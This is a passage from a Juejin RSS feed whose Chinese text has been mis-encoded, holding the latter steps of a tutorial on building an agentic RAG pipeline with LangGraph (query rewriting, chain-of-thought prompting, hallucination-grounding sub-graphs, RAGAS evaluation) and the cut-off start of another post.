<li><strong>è¾“å…¥ï¼š</strong> Â ç”¨æˆ·çš„æŸ¥è¯¢ (<code>{query}</code>) å’Œæ£€ç´¢åˆ°çš„æ‰€æœ‰æ–‡æ¡£å†…å®¹ (<code>{retrieved_documents}</code>)ã€‚</li>
<li><strong>æ ¸å¿ƒæŒ‡ä»¤ï¼š</strong> Â è¿‡æ»¤æ‰æ‰€æœ‰ä¸æŸ¥è¯¢<strong>ä¸ç›¸å…³</strong>çš„ä¿¡æ¯ã€‚</li>
</ul>
<h3 data-id="heading-13">æ­¥éª¤9ï¼šæŸ¥è¯¢é‡å†™å™¨ï¼ˆä¼˜åŒ–æ£€ç´¢çš„â€œè¯­ä¹‰æ¡¥æ¢â€ï¼‰</h3>
<p>åœ¨ RAG ç®¡é“ä¸­ï¼Œç”¨æˆ·æœ€åˆçš„æé—®ï¼ˆQueryï¼‰å¾€å¾€<strong>ä¸å¤Ÿç²¾ç¡®</strong>æˆ–<strong>è¿‡äºç®€ç•¥</strong>ã€‚å¦‚æœç›´æ¥ä½¿ç”¨è¿™æ ·çš„æŸ¥è¯¢è¿›è¡Œå‘é‡æ£€ç´¢ï¼Œå¯èƒ½ä¼šå¯¼è‡´ï¼š</p>
<ol>
<li><strong>æ£€ç´¢ä¸å‡†ç¡®ï¼š</strong> Â æ— æ³•æ•è·æŸ¥è¯¢çš„å®Œæ•´<strong>è¯­ä¹‰æ„å›¾</strong>ï¼Œè¿”å›ä¸ç›¸å…³çš„æ–‡æ¡£ã€‚</li>
<li><strong>å†…å®¹ä¸è¶³ï¼š</strong> Â æ£€ç´¢ç»“æœæ— æ³•æä¾›è¶³å¤Ÿçš„ä¿¡æ¯æ¥æ”¯æ’‘é«˜è´¨é‡çš„å›ç­”ã€‚</li>
</ol>
<p>ä¸ä¸Šä¸‹æ–‡è¿‡æ»¤å™¨ç±»ä¼¼ï¼Œæˆ‘ä»¬é¦–å…ˆä½¿ç”¨Â <strong>Pydantic</strong>Â å®šä¹‰äº† LLM è¾“å‡ºçš„ç»“æ„ï¼Œä»¥ç¡®ä¿é‡å†™åçš„ç»“æœæ˜¯<strong>ç¨³å®šã€å¯æ§</strong>çš„ JSON æ ¼å¼ã€‚</p>























<table><thead><tr><th><strong>å­—æ®µ</strong></th><th><strong>ç±»å‹</strong></th><th><strong>æè¿°</strong></th><th><strong>ç›®çš„</strong></th></tr></thead><tbody><tr><td><strong><code>rewritten_question</code></strong></td><td>å­—ç¬¦ä¸²</td><td>ç»è¿‡ä¼˜åŒ–çš„ã€ç”¨äºå‘é‡æ£€ç´¢çš„æ”¹è¿›é—®é¢˜ã€‚</td><td><strong>æ ¸å¿ƒè¾“å‡º</strong> ï¼šç”¨äºæ›¿ä»£åŸå§‹æŸ¥è¯¢è¿›è¡Œæ£€ç´¢ã€‚</td></tr><tr><td><strong><code>explanation</code></strong></td><td>å­—ç¬¦ä¸²</td><td>å¯¹é‡å†™åé—®é¢˜çš„è§£é‡Šå’Œç†ç”±ã€‚</td><td><strong>å¯è§£é‡Šæ€§</strong> ï¼šä¾¿äºè°ƒè¯•å’Œç†è§£ LLM çš„æ¨ç†è¿‡ç¨‹ã€‚</td></tr></tbody></table>
<h3 data-id="heading-14">æ­¥éª¤10ï¼šChain-of-Thought (CoT) æ¨ç†ï¼ˆå¢å¼º LLM çš„ç­”æ¡ˆç”Ÿæˆèƒ½åŠ›ï¼‰</h3>
<p>CoT æ¨ç†çš„ä¸€ä¸ªæŒ‘æˆ˜æ˜¯ç¡®ä¿ LLM æ¯æ¬¡éƒ½èƒ½ä»¥<strong>ä¸€è‡´çš„ã€é«˜è´¨é‡çš„é€»è¾‘é£æ ¼</strong>è¿›è¡Œæ¨ç†ã€‚æˆ‘ä»¬é€šè¿‡Â <strong>Few-Shot CoT</strong>Â æ–¹æ³•æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼šåœ¨ Prompt æ¨¡æ¿ä¸­æä¾›å¤šä¸ªæ¨ç†èŒƒä¾‹ (Examples)ï¼Œå±•ç¤ºæ‰€éœ€çš„æ€ç»´é“¾æ¡å’Œæœ€ç»ˆç­”æ¡ˆç»“æ„ã€‚</p>
<p>æˆ‘ä»¬æä¾›çš„èŒƒä¾‹å±•ç¤ºäº†ä¸‰ç§å…³é”®æ¨ç†åœºæ™¯ï¼š</p>
<ol>
<li><strong>é€»è¾‘æ¯”è¾ƒ (Example 1)ï¼š</strong> Â æ¶‰åŠå…³ç³»æ¨ç†å’Œæ’åºï¼ˆMary &gt; Tom &gt; Janeï¼‰ã€‚</li>
<li><strong>ä¿¡æ¯èšåˆ (Example 2)ï¼š</strong> Â æ¶‰åŠä»ä¸Šä¸‹æ–‡ä¸­æå–å’Œæ€»ç»“å¤šä¸ªäº‹å®ã€‚</li>
<li><strong>ä¿¡æ¯ç¼ºå¤±åˆ¤æ–­ (Example 3)ï¼š</strong> Â æ˜ç¡®æŒ‡å‡ºå½“ä¸Šä¸‹æ–‡ä¸­<strong>ä¸åŒ…å«</strong>è¶³å¤Ÿä¿¡æ¯æ—¶ï¼ŒLLM åº”è¯¥å›ç­”â€œæ²¡æœ‰è¶³å¤Ÿçš„ä¸Šä¸‹æ–‡â€ã€‚</li>
</ol>
<p>å½“ LLM æ¥æ”¶åˆ°ç”¨æˆ·çš„<strong>æŸ¥è¯¢</strong>å’Œ<strong>ç²¾ç‚¼åçš„ä¸Šä¸‹æ–‡</strong>åï¼Œå®ƒå°†è¢«è¦æ±‚å…ˆè¾“å‡ºä¸€ä¸ªåä¸ºÂ <code>Reasoning</code>Â çš„å†…éƒ¨æ€è€ƒè¿‡ç¨‹ï¼Œæœ€åå†è¾“å‡ºæœ€ç»ˆçš„Â <code>Final Answer</code>ã€‚</p>
<h3 data-id="heading-15">æ­¥éª¤11ï¼šç›¸å…³æ€§ä¸äº‹å®åŸºç¡€æ£€æŸ¥ï¼ˆRAG ç®¡é“çš„æœ€ç»ˆæ ¡å‡†ï¼‰</h3>
<p>åœ¨ RAG ç®¡é“ä¸­ï¼Œ<strong>æ£€ç´¢</strong>ã€<strong>è¿‡æ»¤</strong>å’ŒÂ <strong>CoT æ¨ç†</strong>æ˜¯æ ¸å¿ƒã€‚ç„¶è€Œï¼Œä¸ºäº†ç¡®ä¿ç³»ç»Ÿçš„<strong>é«˜å‡†ç¡®åº¦ (High Accuracy)</strong> Â å’Œ<strong>å¯ä¿¡åº¦ (Trustworthiness)</strong> ï¼Œæˆ‘ä»¬éœ€è¦å¯¹æ£€ç´¢åˆ°çš„ä¿¡æ¯å’Œç”Ÿæˆçš„ç­”æ¡ˆè¿›è¡Œæœ€ç»ˆçš„<strong>åŒé‡éªŒè¯</strong>ï¼š</p>
<ol>
<li><strong>ä¼ ç»Ÿç›¸å…³æ€§æ£€æŸ¥ï¼š</strong> Â æ£€æŸ¥<strong>æ–‡æ¡£æœ¬èº«</strong>æ˜¯å¦ä¸æŸ¥è¯¢ç›¸å…³ã€‚</li>
<li><strong>äº‹å®åŸºç¡€æ£€æŸ¥ (Ground Truth)ï¼š</strong> Â æ£€æŸ¥Â <strong>LLM ç”Ÿæˆçš„ç­”æ¡ˆ</strong>æ˜¯å¦å®Œå…¨åŸºäºæä¾›çš„ä¸Šä¸‹æ–‡ï¼Œé˜²æ­¢å¹»è§‰ (Hallucination)ã€‚</li>
</ol>
<h3 data-id="heading-16">æ­¥éª¤12ï¼šä½¿ç”¨ LangGraph å¯è§†åŒ–æˆ‘ä»¬çš„ RAG ç®¡é“</h3>
<p>æˆ‘ä»¬çš„ RAG è§£å†³æ–¹æ¡ˆæ˜¯ä¸€ä¸ª<strong>æœ‰å‘å›¾ (Directed Graph)</strong> ï¼Œå®ƒå®šä¹‰äº†ä¸€ä¸ªåŸºäº<strong>æ¡ä»¶é€»è¾‘</strong>å’Œ<strong>å¾ªç¯åé¦ˆ</strong>çš„å·¥ä½œæµã€‚è¿™ä¸ªå·¥ä½œæµä¸æ˜¯çº¿æ€§çš„ï¼Œè€Œæ˜¯å…·å¤‡è‡ªé€‚åº”èƒ½åŠ›çš„Â <strong>Agentic RAG</strong>Â æ¨¡å¼ã€‚</p>
<p>æˆ‘ä»¬å°†ä¹‹å‰å®ç°çš„äº”ä¸ªå…³é”®åŠŸèƒ½ï¼ˆ<code>retrieve</code>ã€<code>filter</code>ã€<code>rewrite</code>ã€<code>answer</code>ï¼‰ä½œä¸ºå›¾ä¸­çš„<strong>èŠ‚ç‚¹ (Nodes)</strong> Â æ·»åŠ åˆ°å·¥ä½œæµä¸­ã€‚æ¯ä¸ªèŠ‚ç‚¹éƒ½ä»£è¡¨ä¸€ä¸ªå•ä¸€ã€ç‹¬ç«‹çš„å¤„ç†æ­¥éª¤ã€‚</p>






























<table><thead><tr><th><strong>èŠ‚ç‚¹åç§°</strong></th><th><strong>å¯¹åº”åŠŸèƒ½</strong></th><th><strong>ä½œç”¨</strong></th></tr></thead><tbody><tr><td><strong><code>retrieve</code></strong></td><td><code>retrieve_context_per_question</code></td><td>ä»å‘é‡å­˜å‚¨ä¸­è·å–å¤šæºä¸Šä¸‹æ–‡ã€‚</td></tr><tr><td><strong><code>filter</code></strong></td><td><code>keep_only_relevant_content</code></td><td>ä½¿ç”¨ LLM è¿‡æ»¤ä¸Šä¸‹æ–‡ä¸­çš„æ— å…³ä¿¡æ¯ã€‚</td></tr><tr><td><strong><code>rewrite</code></strong></td><td><code>rewrite_question</code></td><td>ä½¿ç”¨ LLM ä¼˜åŒ–æŸ¥è¯¢ï¼Œä»¥è¿›è¡Œæ›´å¥½çš„æ£€ç´¢ã€‚</td></tr><tr><td><strong><code>answer</code></strong></td><td><code>answer_question_from_context</code></td><td>ä½¿ç”¨ CoT æ¨ç†ç”Ÿæˆç­”æ¡ˆã€‚</td></tr></tbody></table>
<p>é€šè¿‡ LangGraph çš„Â <code>draw_mermaid_png</code>Â æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥å°†ä¸Šè¿°é€»è¾‘æ¸…æ™°åœ°å‘ˆç°ä¸ºå›¾å½¢ï¼Œç›´è§‚åœ°å±•ç¤ºäº†Â <strong>LangGraph å¦‚ä½•åˆ›å»ºäº†ä¸€ä¸ªå…·å¤‡æ¨ç†ã€å†³ç­–å’Œè‡ªä¼˜åŒ–èƒ½åŠ›çš„ Agentic RAG ç®¡é“ã€‚</strong></p>
<p>è¿™ä¸ªå¯è§†åŒ–å›¾æ¸…æ™°åœ°ä½“ç°äº†æµç¨‹ä¸­çš„<strong>ä¸¤ä¸ªæ ¸å¿ƒå¾ªç¯</strong>ï¼š</p>
<ol>
<li><strong>æ£€ç´¢ä¼˜åŒ–å¾ªç¯ (<code>filter``rewrite``retrieve</code>):</strong> Â å½“ç¬¬ä¸€æ¬¡æ£€ç´¢çš„ä¸Šä¸‹æ–‡è´¨é‡ä¸è¶³æ—¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨ä¼˜åŒ–æŸ¥è¯¢å¹¶è¿›è¡ŒäºŒæ¬¡æ£€ç´¢ã€‚</li>
<li><strong>ç­”æ¡ˆè‡ªä¿®å¤å¾ªç¯ (<code>answer``answer</code>Â æˆ–Â <code>rewrite</code>):</strong> Â å½“ç”Ÿæˆçš„ç­”æ¡ˆå­˜åœ¨å¹»è§‰æ—¶ï¼ŒLLM å°è¯•é‡æ–°ç”Ÿæˆï¼›å½“ç­”æ¡ˆä¿¡æ¯ä¸è¶³æ—¶ï¼Œç³»ç»Ÿä¼šå°è¯•ä¼˜åŒ–æŸ¥è¯¢ï¼Œä»å¤´å¼€å§‹è·å–æ›´å¤šä¸Šä¸‹æ–‡ã€‚</li>
</ol>
<h3 data-id="heading-17">æ­¥éª¤13ï¼šå­å›¾æ¶æ„ä¸å†…å®¹è’¸é¦åŸºç¡€æ£€æŸ¥</h3>
<p>åœ¨å¤æ‚çš„ RAG åº”ç”¨åœºæ™¯ä¸­ï¼Œå°¤å…¶æ˜¯åœ¨å¤„ç†éœ€è¦å¤šæ­¥éª¤æ¨ç†æˆ–ä»»åŠ¡åˆ†è§£çš„æŸ¥è¯¢æ—¶ï¼Œçº¿æ€§çš„ RAG æµç¨‹å¾€å¾€åŠ›ä¸ä»å¿ƒã€‚ä¸ºäº†æ„å»ºæ›´<strong>æ¨¡å—åŒ– (Modular)</strong> ã€æ›´<strong>å¥å£® (Robust)</strong> Â å’Œ<strong>å¯æ‰©å±• (Scalable)</strong> Â çš„è§£å†³æ–¹æ¡ˆï¼Œæˆ‘ä»¬å¼•å…¥äº†Â <strong>å­å›¾æ¶æ„ (Sub-Graph Approach)</strong> Â å’Œ<strong>å†…å®¹è’¸é¦ (Distillation Grounding)</strong> Â æœºåˆ¶ã€‚</p>
<p>å­å›¾æ–¹æ³•çš„æ ¸å¿ƒæ€æƒ³æ˜¯å°†ä¸€ä¸ªå¤æ‚çš„å·¥ä½œæµåˆ†è§£ä¸ºå¤šä¸ª<strong>ç‹¬ç«‹çš„ã€åŠŸèƒ½ä¸“æ³¨çš„å­å›¾</strong>ã€‚</p>
<ul>
<li><strong>ä¼ ç»Ÿ RAGï¼š</strong> Â å•ä¸€çš„å¤§å›¾åŒ…å«æ‰€æœ‰é€»è¾‘ï¼Œç»´æŠ¤å’Œè°ƒè¯•å¤æ‚ã€‚</li>
<li><strong>å­å›¾æ¶æ„ï¼š</strong> Â æ¯ä¸ªæ ¸å¿ƒåŠŸèƒ½ï¼ˆå¦‚æŸ¥è¯¢é‡å†™ã€æ–‡æ¡£è¿‡æ»¤ã€äº‹å®æ ¸æŸ¥ï¼‰éƒ½å¯ä»¥è¢«å°è£…ä¸ºä¸€ä¸ªç‹¬ç«‹çš„Â <strong>LangGraph å­å›¾</strong>ã€‚è¿™äº›å­å›¾æ‹¥æœ‰è‡ªå·±çš„è¾“å…¥ã€è¾“å‡ºå’Œå†…éƒ¨é€»è¾‘ï¼Œå®ƒä»¬åƒä¹é«˜ç§¯æœ¨ä¸€æ ·ï¼Œå¯ä»¥è¢«ä¸»å›¾<strong>è°ƒç”¨ (Invoke)</strong> Â æˆ–<strong>é“¾æ¥ (Chain)</strong> Â èµ·æ¥ã€‚</li>
</ul>
<p>é€šè¿‡Â <strong>LangGraph å­å›¾ (Sub-Graph)</strong> Â æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ºæ¯ä¸ªæ•°æ®æºå®šåˆ¶ä¸€ä¸ª<strong>ä¸“æ³¨çš„</strong>ã€<strong>è‡ªæ ¡éªŒçš„</strong>æ£€ç´¢å·¥ä½œæµã€‚è¿™ä¸ä»…æé«˜äº†æ¨¡å—åŒ–ç¨‹åº¦ï¼Œè¿˜ç¡®ä¿äº†æ¯ä¸ªæºçš„è¾“å‡ºå†…å®¹éƒ½ç»è¿‡äº†ä¸¥æ ¼çš„<strong>äº‹å®åŸºç¡€ (Grounding)</strong> Â æ£€æŸ¥ã€‚</p>
<p>æˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªé«˜é˜¶å‡½æ•°Â <code>build_retrieval_workflow</code>ï¼Œå®ƒèƒ½å¤Ÿä¸ºä»»ä½•ç»™å®šçš„æ£€ç´¢å‡½æ•°ï¼ˆ<code>retrieve_fn</code>ï¼‰æ„å»ºä¸€ä¸ª<strong>è‡ªå¾ªç¯æ ¡éªŒ</strong>çš„å­å›¾ã€‚</p>
<p>è¿™ä¸ªå­å›¾çš„æ ¸å¿ƒæ˜¯<strong>å†…å®¹è’¸é¦</strong>å’Œ<strong>äº‹å®åŸºç¡€æ£€æŸ¥</strong>çš„å¾ªç¯æœºåˆ¶ï¼š</p>
<ol>
<li><strong>èŠ‚ç‚¹ 1ï¼šæ£€ç´¢ (<code>node_name</code>)</strong> Â - è·å–åŸå§‹ä¸Šä¸‹æ–‡ã€‚</li>
<li><strong>èŠ‚ç‚¹ 2ï¼šè¿‡æ»¤ (<code>keep_only_relevant_content</code>)</strong> Â - ä½¿ç”¨ LLMï¼ˆå¦‚ Llama 3.3ï¼‰å°†åŸå§‹ä¸Šä¸‹æ–‡æç‚¼ä¸ºÂ <code>relevant_context</code>ã€‚</li>
<li><strong>æ¡ä»¶è¾¹ç¼˜ï¼šäº‹å®åŸºç¡€æ£€æŸ¥ (<code>is_distilled_content_grounded_on_content</code>)</strong> Â - è¿™ä¸€æ­¥æ˜¯å…³é”®çš„è´¨é‡é—¨ (Quality Gate)ã€‚å®ƒæ£€æŸ¥ï¼š</li>
</ol>
<ul>
<li><strong>å¦‚æœ</strong>æç‚¼åçš„å†…å®¹<strong>å®Œå…¨åŸºäº</strong>åŸå§‹ä¸Šä¸‹æ–‡ (<code>"grounded on the original context"</code>)Â ç»“æŸ (END)ï¼Œè¾“å‡ºå¯é çš„æç‚¼å†…å®¹ã€‚</li>
<li><strong>å¦‚æœ</strong>æç‚¼è¿‡ç¨‹ä¸­<strong>å¼•å…¥äº†æ–°çš„ä¿¡æ¯</strong>ï¼ˆå¹»è§‰ï¼‰Â <strong>å¾ªç¯å›åˆ°è¿‡æ»¤èŠ‚ç‚¹</strong>Â (<code>"keep_only_relevant_content"</code>)ï¼Œè¦æ±‚ LLMÂ <strong>é‡æ–°</strong>è¿›è¡Œæç‚¼ï¼Œç›´åˆ°å†…å®¹ç¬¦åˆäº‹å®åŸºç¡€è¦æ±‚ã€‚</li>
</ul>
<h3 data-id="heading-18">æ­¥éª¤14ï¼šæ„å»ºæŠ—å¹»è§‰å­å›¾ï¼ˆæå‡ RAG ç­”æ¡ˆå¯ä¿¡åº¦ï¼‰</h3>
<p>ä¸ºäº†åœ¨æœ€ç»ˆçš„ç­”æ¡ˆç”Ÿæˆé˜¶æ®µå¼•å…¥ä¸€ä¸ª<strong>ä¸¥æ ¼çš„è´¨é‡æ§åˆ¶æœºåˆ¶</strong>ï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªä¸“é—¨çš„Â <strong>LangGraph å­å›¾</strong>ï¼Œå…¶æ ¸å¿ƒç›®æ ‡æ˜¯ï¼š<strong>ç¡®ä¿ç”Ÿæˆçš„ç­”æ¡ˆå®Œå…¨åŸºäºæä¾›çš„ä¸Šä¸‹æ–‡</strong>ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3b3ece199a2b45e994132eab4b3c4f6b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764592734&amp;x-signature=b%2FgqjiIvXDEoTLtlkjE%2BHg9shRY%3D" alt="" loading="lazy"/></p>
<p>æˆ‘ä»¬æ„å»ºäº†ä¸€ä¸ªä¸“ç”¨äºç­”æ¡ˆç”Ÿæˆçš„å­å›¾ã€‚è¿™ä¸ªå›¾ç»“æ„éå¸¸ç®€æ´ï¼Œä½†å´åŒ…å«äº†ä¸€ä¸ªå¼ºå¤§çš„<strong>è‡ªä¿®å¤å¾ªç¯</strong>ï¼š</p>
<ol>
<li><strong>èŠ‚ç‚¹ï¼š</strong> <code>answer</code>ï¼ˆè°ƒç”¨Â <code>answer_question_from_context</code>Â å‡½æ•°ç”Ÿæˆç­”æ¡ˆï¼‰ã€‚</li>
<li><strong>å…¥å£ç‚¹ï¼š</strong> Â æµç¨‹å§‹äºÂ <code>answer</code>Â èŠ‚ç‚¹ã€‚</li>
<li><strong>æ¡ä»¶è¾¹ç¼˜ï¼š</strong> Â ç­”æ¡ˆç”Ÿæˆåï¼Œç«‹å³é€šè¿‡Â <code>is_answer_grounded_on_context</code>Â å‡½æ•°è¿›è¡Œæ ¡éªŒï¼š</li>
</ol>
<ul>
<li><strong>å¦‚æœ</strong>æ ¡éªŒç»“æœä¸ºÂ <code>"grounded on context"</code>ç»“æŸ (END)ï¼Œç­”æ¡ˆå¯é ã€‚</li>
<li><strong>å¦‚æœ</strong>æ ¡éªŒç»“æœä¸ºÂ <code>"hallucination"</code><strong>å¾ªç¯å›åˆ°Â <code>answer</code>Â èŠ‚ç‚¹</strong>ï¼Œè¦æ±‚ LLM åœ¨ç›¸åŒçš„ä¸Šä¸‹æ–‡ä¸­<strong>é‡æ–°ç”Ÿæˆ</strong>ç­”æ¡ˆã€‚</li>
</ul>
<h3 data-id="heading-19">æ­¥éª¤15ï¼šRAGASæœ€ç»ˆç¼–è¯‘ã€æµ‹è¯•ä¸è¯„ä¼°</h3>
<p>ç¼–è¯‘åçš„ RAG ç®¡é“ä¸å†æ˜¯ç®€å•çš„çº¿æ€§æµç¨‹ï¼Œè€Œæ˜¯ä¸€ä¸ªé«˜åº¦å¤æ‚çš„ã€è‡ªé€‚åº”çš„å›¾ç»“æ„ï¼š</p>
<ol>
<li><strong>å»åè§ (Anonymize)ï¼š</strong> Â åŒ¿ååŒ–ç”¨æˆ·æŸ¥è¯¢ï¼Œé˜²æ­¢ LLM è§„åˆ’æ—¶äº§ç”Ÿå…ˆéªŒçŸ¥è¯†åè§ã€‚</li>
<li><strong>è§„åˆ’ (Plan)ï¼š</strong> Â åŸºäºåŒ¿åæŸ¥è¯¢åˆ›å»ºé«˜å±‚æ‰§è¡Œç­–ç•¥ã€‚</li>
<li><strong>ååŒ¿ååŒ– (De-anonymize)ï¼š</strong> Â å°†å®ä½“é‡æ–°æ˜ å°„å›è®¡åˆ’ï¼Œä½¿å…¶å…·å¤‡ä¸Šä¸‹æ–‡ã€‚</li>
<li><strong>åˆ†è§£ (Break Down)ï¼š</strong> Â å°†é«˜å±‚è®¡åˆ’ç»†åŒ–ä¸ºå¯æ‰§è¡Œçš„å·¥å…·ä»»åŠ¡ã€‚</li>
<li><strong>æ‰§è¡Œ (Execute/Task Handler)ï¼š</strong> Â æ ¹æ®å½“å‰ä»»åŠ¡é€‰æ‹©å¹¶è°ƒç”¨å¯¹åº”çš„<strong>æ£€ç´¢å­å›¾</strong>ï¼ˆQuotes, Chunks, Summariesï¼‰ã€‚</li>
<li><strong>é‡è§„åˆ’ (Replanning)ï¼š</strong> Â æ£€ç´¢åï¼ŒLLM è¯„ä¼°æ–°è·å–çš„ä¸Šä¸‹æ–‡ï¼ŒåŠ¨æ€è°ƒæ•´å‰©ä½™è®¡åˆ’ã€‚</li>
<li><strong>ç­”æ¡ˆç”Ÿæˆ (Answer)ï¼š</strong> Â å½“æœ‰è¶³å¤Ÿä¿¡æ¯æ—¶ï¼Œè°ƒç”¨<strong>æŠ—å¹»è§‰å­å›¾</strong>ï¼Œç”Ÿæˆæœ€ç»ˆç­”æ¡ˆã€‚</li>
<li><strong>ç»“æŸ (END)ï¼š</strong> Â ç­”æ¡ˆé€šè¿‡äº‹å®æ ¡éªŒåï¼Œæµç¨‹ç»ˆæ­¢ã€‚</li>
</ol>
<p>æµ‹è¯•å®Œæˆåï¼Œæˆ‘ä»¬ä½¿ç”¨Â <strong>RAGAS</strong>ï¼ˆä¸€ä¸ªç”¨äºè¯„ä¼° RAG ç³»ç»Ÿçš„å…ˆè¿›æ¡†æ¶ï¼‰å¯¹ç®¡é“è¿›è¡Œ<strong>å®¢è§‚é‡åŒ–è¯„ä¼°</strong>ã€‚</p>
<p>æˆ‘ä»¬é€‰æ‹©äº†äº”ä¸ªå…³é”®æŒ‡æ ‡æ¥å…¨é¢è¯„ä¼° RAG ç³»ç»Ÿçš„è´¨é‡ï¼š</p>
<ol>
<li><strong>Answer Correctness (ç­”æ¡ˆæ­£ç¡®æ€§):</strong> Â ç­”æ¡ˆæ˜¯å¦äº‹å®æ­£ç¡®ã€‚</li>
<li><strong>Faithfulness (å¿ å®åº¦):</strong> Â ç­”æ¡ˆæ˜¯å¦åªåŸºäºæä¾›çš„ä¸Šä¸‹æ–‡ï¼ˆé˜²å¹»è§‰ï¼‰ã€‚</li>
<li><strong>Answer Relevancy (ç­”æ¡ˆç›¸å…³æ€§):</strong> Â ç­”æ¡ˆæ˜¯å¦ç²¾ç¡®å›ç­”äº†é—®é¢˜ã€‚</li>
<li><strong>Context Recall (ä¸Šä¸‹æ–‡å¬å›ç‡):</strong> Â æœ‰ç”¨ä¿¡æ¯æ˜¯å¦éƒ½è¢«æ£€ç´¢åˆ°ã€‚</li>
<li><strong>Answer Similarity (ç­”æ¡ˆç›¸ä¼¼åº¦):</strong> Â ç­”æ¡ˆä¸æ ‡å‡†ç­”æ¡ˆçš„è¯­ä¹‰ç›¸ä¼¼ç¨‹åº¦ã€‚</li>
</ol>
<h2 data-id="heading-20">å­¦ä¹ èµ„æºæ¨è</h2>
<p>å¦‚æœä½ æƒ³æ›´æ·±å…¥åœ°å­¦ä¹ å¤§æ¨¡å‹ï¼Œä»¥ä¸‹æ˜¯ä¸€äº›éå¸¸æœ‰ä»·å€¼çš„å­¦ä¹ èµ„æºï¼Œè¿™äº›èµ„æºå°†å¸®åŠ©ä½ ä»ä¸åŒè§’åº¦å­¦ä¹ å¤§æ¨¡å‹ï¼Œæå‡ä½ çš„å®è·µèƒ½åŠ›ã€‚</p>
<blockquote>
<p>æœ¬æ–‡è¾ƒé•¿ï¼Œå»ºè®®ç‚¹èµæ”¶è—ã€‚æ›´å¤šAIå¤§æ¨¡å‹åº”ç”¨å¼€å‘å­¦ä¹ è§†é¢‘åŠèµ„æ–™ï¼Œåœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">æ™ºæ³ŠAI</a>ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[kotlin-7]]></title>    <link>https://juejin.cn/post/7575897635137945600</link>    <guid>https://juejin.cn/post/7575897635137945600</guid>    <pubDate>2025-11-24T12:44:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575897635137945600" data-draft-id="7571295102850662426" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="kotlin-7"/> <meta itemprop="keywords" content="GitHub"/> <meta itemprop="datePublished" content="2025-11-24T12:44:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é£å†·"/> <meta itemprop="url" content="https://juejin.cn/user/3843548379091742"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            kotlin-7
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3843548379091742/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é£å†·
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T12:44:56.000Z" title="Mon Nov 24 2025 12:44:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body 